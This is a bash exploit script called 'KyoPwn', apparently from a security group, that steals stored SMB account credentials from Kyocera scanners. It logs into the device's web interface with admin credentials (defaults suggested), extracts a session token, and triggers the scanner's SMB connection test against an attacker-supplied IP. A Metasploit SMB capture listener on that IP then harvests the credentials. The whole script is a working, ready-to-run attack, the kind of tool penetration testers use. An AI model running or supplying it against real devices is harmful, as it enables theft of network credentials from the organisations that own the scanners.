#!/bin/bash

IFS='\n'

function usage (){
  echo "KyoPwn"
  echo "by G-Factor Security (@GFSec)"
  echo ""
  echo "A tool for stealing SMB user credentials from Kyocera scanners"
  echo ""
  echo "This tool will start an SMB listener (via Metasploit) and send the necessary request"
  echo "to the target device to send an SMB test to your local listener, capturing SMB credentials"
  echo ""
  echo "Usage: $0 KyoceraIP YourIP YourSMBPort SMBUser AdminUser AdminPW"
  echo ""
  echo "KyoceraIP: The IP of the targeted device"
  echo "YourIP: The IP address of your local system (for sending credentials)"
  echo "YourSMBPort: The local port for receiving SMB requests"
  echo "SMBUser: The username of the account you wish to steal"
  echo "AdminUser: The username of an admin on the Kyocera (default on devices is 'Admin', case-sensitive)"
  echo "AdminPW : The password of the admin account being used on the Kyocera (default on devices is 'Admin')"
  echo ""
  echo "Exampe: $0 192.168.0.2 192.168.0.100 445 ScanUser Admin Admin"
  exit
}

ip=$1

#if help switch given
if [[ "$ip" == "-h" ]]
then
  usage
fi

#if not 6 arguments given
if [ "$#" -ne 6 ]
then
  usage
fi

smb_target=$2
smb_port=$3
smb_user=$4
admin_user=$5
admin_pw=$6

#Line below is for proxying requests through local HTTP proxy for debugging (ie with Burp)
#export http_proxy=http://127.0.0.1:8080/

#if the device is in Deep Sleep mode, wake it up
if (( $( curl -s $ip | grep -c "DeepSleep") == 1))
then
  echo "Device asleep. Waking up..."
  curl -i -s -k -o /dev/null -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $"Referer: http://$ip/DeepSleep.htm" -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'submit001=Start&okhtmfile=DeepSleepApply.htm&func=wakeup' \
    $"http://$ip/esu/set.cgi"
  sleep 10
fi

#save initial cookie to local Cookie Jar
curl -s -c /tmp/kyocookies -o /dev/null $ip 

#authenticate with the device
curl -i -s -o /dev/null -k -c /tmp/kyocookies -X $'POST' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' \
 -H $"Referer: http://$ip/startwlm/Start_Wlm.htm" -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded' \
  -b /tmp/kyocookies --data-binary $"failhtmfile=%2Fstartwlm%2FStart_Wlm.htm&okhtmfile=%2Fstartwlm%2FStart_Wlm.htm&func=authLogin&arg03_LoginType=_mode_off&arg04_LoginFrom=_wlm_login&language=..%2Fwlmeng%2Findex.htm&hiddRefreshDevice=..%2Fstartwlm%2FHme_DvcSts.htm&hiddRefreshPanelUsed=..%2Fstartwlm%2FHme_PnlUsg.htm&hiddRefreshPaperid=..%2Fstartwlm%2FHme_Paper.htm&hiddRefreshTonerid=..%2Fstartwlm%2FHme_StplPnch.htm&hiddRefreshStapleid=..%2Fstartwlm%2FHme_Toner.htm&hiddnBackNavIndx=1&hiddRefreshDeviceBack=&hiddRefreshPanelUsedBack=&hiddRefreshPaperidBack=&hiddRefreshToneridBack=&hiddRefreshStapleidBack=&hiddCompatibility=&hiddPasswordToOpenChk=&hiddPasswordToOpen=&hiddRePasswordToOpen=&hiddPasswordToEditChk=&hiddPasswordToEdit=&hiddRePasswordToEdit=&hiddPrinting=&hiddChanges=&hiddCopyingOfText=&hiddEmaiSID=&hiddEmaiName=&hiddECM=&hiddDocID=&privid=&publicid=&attrtype=&attrname=&hiddFolderType=&hiddFolderSMBType=&hiddFolderFTPType=&hiddSMBNumber1=&hiddSMBNumber2=&hiddSMBNumber3=&hiddSMBNumber4=&hiddSMBNumber5=&hiddSMBNumber6=&hiddSMBNumber7=&hiddFTPNumber1=&hiddFTPNumber2=&hiddFTPNumber3=&hiddFTPNumber4=&hiddFTPNumber5=&hiddFTPNumber6=&hiddFTPNumber7=&hiddFAXAddress1=&hiddFAXAddress2=&hiddFAXAddress3=&hiddFAXAddress4=&hiddFAXAddress5=&hiddFAXAddress6=&hiddFAXAddress7=&hiddFAXAddress8=&hiddFAXAddress9=&hiddFAXAddress10=&hiddIFaxAdd=&hiddIFaxViaServer=&hiddIFaxConnMode=&hiddIFaxResolution=&hiddIFaxResolution1=&hiddIFaxResolution2=&hiddIFaxResolution3=&hiddIFaxResolution4=&hiddIFaxResolution5=&hiddIFaxComplession=&hiddIFaxPaperSize=&hiddIFaxPaperSize1=&hiddIFaxPaperSize2=&hiddIFaxPaperSize3=&hiddImage=&hiddTest=&hiddDoc_Num=&hiddCopy=&hiddDocument=&hiddDocRec=&AddressNumberPersonal=&AddressNumberGroup=&hiddPersonAddressID=&hiddGroupAddressID=&hiddPrnBasic=&hiddPageName=&hiddDwnLoadType=&hiddPrintType=&hiddSend1=&hiddSend2=&hiddSend3=&hiddSend4=&hiddSend5=&hiddAddrBokBackUrl=&hiddAddrBokNumber=&hiddAddrBokName=&hiddAddrBokFname=&hiddSendFileName=&hiddenAddressbook=&hiddenAddressbook1=&hiddSendDoc_Num=&hiddSendColor=&hiddSendAddInfo=&hiddSendFileFormat=&hiddMoveConfScn=&hiddRefreshDevice=..%2Fstartwlm%2FHme_DvcSts.htm&hiddRefreshPanelUsed=..%2Fstartwlm%2FHme_PnlUsg.htm&hiddRefreshPaperid=..%2Fstartwlm%2FHme_Paper.htm&hiddRefreshTonerid=..%2Fstartwlm%2FHme_StplPnch.htm&hiddRefreshStapleid=..%2Fstartwlm%2FHme_Toner.htm&hiddnBackNavIndx=0&hiddRefreshDeviceBack=&hiddRefreshPanelUsedBack=&hiddRefreshPaperidBack=&hiddRefreshToneridBack=&hiddRefreshStapleidBack=&hiddValue=&arg01_UserName=$admin_user&arg02_Password=$admin_pw&arg03_LoginType=&arg05_AccountId=&Login=Login&arg06_DomainName=&hndHeight=0" \
  $"http://$ip/startwlm/login.cgi"

#get the 'hidden' random value; essentially a token
hidden=$(curl -i -s -k -X $'GET' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $"Referer: http://$ip/startwlm/Start_Wlm.htm" -H $'Upgrade-Insecure-Requests: 1' -H $'If-None-Match: \"/basic/AddrBook_Addr.htm, Mon, 09 Jul 2018 13:24:22 GMT\"' -b /tmp/kyocookies $"http://$ip/basic/AddrBook_Addr.htm?arg1=1&arg2=0&arg3=&arg4=1" | grep -m 1 "name=\"hidden" | cut -d'=' -f4 | cut -d'"' -f2)

#metasploit takes a while to start.  queue up the curl commands to run in 15 seconds, and then run msfconsole to start the SMB listener
echo "Waiting 15 seconds for Metasploit to start..."
(sleep 15 && echo "Sending test command" && curl -i -s -k -o /dev/null -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $"Referer: http://$ip/basic/AddrBook_Addr_NewCntct_Prpty.htm?arg1=1&arg2=0&arg3=&arg4=1&arg5=1&arg6=1&arg50=0" -H $'DNT: 1' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b /tmp/kyocookies \
    --data-binary $"okhtmfile=%2Fcommon%2FCommon_Result.htm&failhtmfile=%2Fcommon%2FCommon_Err.htm&func=testConnectionPCFolder&arg01_SMB=0&arg02_SMBHostName=$smb_target&arg03_SMBPortNumber=$smb_port&arg04_SMBPath=scans&arg05_SMBLoginName=$smb_user&arg06_SMBLoginPass=****************&arg07_Href=%2Fbasic%2FAddrBook_Addr_NewCntct_Prpty.htm%3Farg1%3D1%26arg2%3D0%26arg3%3D%26arg4%3D1%26arg50%3D0&arg08_Screen=1&arg09=1&arg10_Screen=addr_book&hidden=$hidden" \
    $"http://$ip/basic/set.cgi" && curl -i -s -k -o /dev/null -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $"Referer: http://$ip/basic/set.cgi" -H $'DNT: 1' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b /tmp/kyocookies \
    --data-binary $"okhtmfile=%2Fcommon%2FCommon_Result.htm&failhtmfile=%2Fcommon%2FCommon_Err.htm&func=getcheckConnectionPCFolder&arg07=0&arg08=&submit001=Submit+Query&hidden=$hidden" \
    $"http://$ip/box/set.cgi")&

#launch msfconsole to capture incoming smb creds
echo "Starting SMB capture..."
msfconsole -x "use auxiliary/server/capture/smb;set SRVPORT $smb_port;run"



